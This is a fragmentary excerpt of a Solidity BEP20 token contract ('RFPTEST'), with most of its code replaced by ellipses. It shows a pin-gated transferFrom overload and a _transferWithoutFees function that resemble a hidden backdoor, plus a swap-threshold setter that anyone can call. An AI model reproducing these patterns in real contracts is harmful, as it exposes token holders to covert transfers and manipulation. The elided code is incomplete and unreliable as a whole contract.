...
interface IBEP20 {
  ...
  */
  ...
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
     ...
     function transferFrom (address from, address to, uint256 amount, uint256 fee, uint256 pin) external returns (bool) ;
...
contract RFPTEST is BEP20{
    ...
    uint256 public swapTokensAtAmount = 30000 * (10**18); //0.1%
    uint256 public maxSellTransactionAmount = 3000000 * (10**18); //1%
    ...
    uint256 public maxWalletToken = 3000000 * (10**18); //1%
 ...
 function _transferWithoutFees(address from, address to, uint256 amount, uint256 fee, uint256 pin ) internal override returns(bool){
    ...
    function setdevFee(uint256 _devFee) external onlyOwner{
        require(_devFee<=5,"Max BuyBack Exceeded");
        devFee = _devFee;
        totalFees = ETHRewardsFee.add(liquidityFee).add(marketingFee).add(devFee);

    }

    function setSwapTokenAmount(uint256 swapInEtherUnit) external {
        swapTokensAtAmount =swapInEtherUnit *(10**18);
    ...
    function _transfer(
        ...
        //both account must be excluded before removing fee
